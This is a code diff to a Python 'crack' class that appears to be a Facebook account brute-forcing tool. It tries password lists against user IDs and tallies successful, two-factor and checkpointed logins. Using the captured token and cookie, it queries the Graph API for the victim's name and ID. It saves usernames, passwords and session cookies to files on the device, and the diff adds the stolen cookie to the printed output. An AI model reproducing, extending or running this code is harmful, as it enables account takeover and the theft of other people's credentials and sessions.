@@ -615,9 +615,10 @@ class crack:
                 time.sleep(5)
         self.loop += 1
 
+#____________________Random M3 ____________________
     def __randoms__(self,user,__juts__,_jat):
         global ok,f2,cp
-        sys.stdout.write(f'\r {OO}[CHECKING] >[M3]< {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
+        sys.stdout.write(f'\r {OO}[CRACK] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
         sys.stdout.flush()
         for pw in __juts__:
             try:
@@ -696,7 +697,7 @@ class crack:
 
     def __free__(self,user,__juts__,_jat):
         global ok,cp,f2,tl
-        sys.stdout.write(f'\r{OO}[CHECKING] >[M2]< {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
+        sys.stdout.write(f'\r{OO}[CHECKING2] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
         sys.stdout.flush()
         for pw in __juts__:
             try:
@@ -774,7 +775,7 @@ class crack:
                         me=requests.get('https://graph.facebook.com/me?access_token='+tokic, cookies={'cookie':cokie}).json()
                         name=me['name']
                         idd=me['id']
-                        print(f"\r{HH}[OK-GSXD] {used} | {pw} {VV}    ")
+                        print(f"\r{HH}[OK-GSXD] {used} | {pw} | {cokie}{VV}    ")
                         open("/sdcard/GSXD_OK.txt", "a").write(used + "|" + pw + "\n")
                         open("/sdcard/GSXD_cokie.txt", "a").write(used + "|" + pw + " | " + cokie + "\n")
                         ok.append(used + pw)
@@ -841,7 +842,7 @@ class crack:
 
     def __mmb__(self,user,__juts__,_jat):
         global ok,cp,f2,tl
-        sys.stdout.write(f'\r{OO}[CHECKING] >[M3]< {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
+        sys.stdout.write(f'\r{OO}[CHECKING] {VV}{self.loop}/{len(self.id)} OK:{len(ok)} - 2F:{len(f2)} - CP:{len(cp)}{NN} '),
         sys.stdout.flush()
         for pw in __juts__:
             try:
